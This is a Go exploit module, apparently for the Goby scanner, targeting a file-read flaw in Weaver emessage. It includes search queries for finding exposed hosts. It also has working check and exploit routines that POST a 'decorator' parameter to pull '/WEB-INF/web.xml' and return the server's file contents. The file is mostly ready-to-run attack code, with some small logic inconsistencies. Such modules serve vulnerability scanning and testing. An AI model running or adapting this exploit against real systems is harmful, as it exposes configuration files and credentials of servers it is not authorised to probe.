package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Weaver-emessage File Read Vulnerability",
    "Description": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "Weaver-Emessage",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-10-19",
    "PostTime": "2024-08-06",
    "Author": "zhengwenjing@baimaohui.net",
    "FofaQuery": "title=\"emessage\" && body=\"管理界面\"",
    "GobyQuery": "title=\"emessage\" && body=\"管理界面\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p> 1. Pay attention to the official patch release information, install the patch or upgrade to the latest version </p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "FilePath",
            "type": "select",
            "value": "Customize",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "decorator=%2FWEB-INF%2Fweb.xml&confirm=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "decorator=%2FWEB-INF%2Fweb.xml&confirm=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.4",
    "Translation": {
        "CN": {
            "Name": "泛微-emessage 文件读取漏洞",
            "Product": "泛微-emessage",
            "Description": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本。</p><p>&nbsp;2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>&nbsp;3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Weaver-emessage File Read Vulnerability",
            "Product": "Weaver-Emessage",
            "Description": "<p>Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;system&nbsp;configuration&nbsp;files),&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;etc.,&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "Recommendation": "<p>&nbsp;1. Pay attention to the official patch release information, install the patch or upgrade to the latest version&nbsp;</p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;system&nbsp;configuration&nbsp;files),&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;etc.,&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9924"
}`

	postOrGet_jwieuh := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		// POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		// URL路径
		url := `/`
		// 拼接文件读取请求数据
		body := `decorator=` + filePath + `&confirm=true`
		resp, err := setPostRequest(hostInfo, url, body)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filePath := `%2FWEB-INF%2Fweb.xml`
			resp, err := postOrGet_jwieuh(hostInfo, filePath)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "<servlet-name>") {
				return false
			}
			ss.VulURL = `/`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := `%2FWEB-INF%2Fweb.xml`
			resp, err := postOrGet_jwieuh(expResult.HostInfo, filePath)
			if err != nil && strings.Contains(err.Error(), "not response 200") {
				expResult.Output = `漏洞利用失败:` + err.Error()
				expResult.Success = false
				return expResult
			}

			// 正则匹配利用结果
			re := regexp.MustCompile(`<servlet-name>`)
			match := re.FindStringSubmatch(resp.Utf8Html)
			if len(match) < 1 {
				expResult.Output = `漏洞利用失败: 未找到匹配的内容`
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = `Extracted content: ` + resp.Utf8Html
			return expResult
		},
	))
}
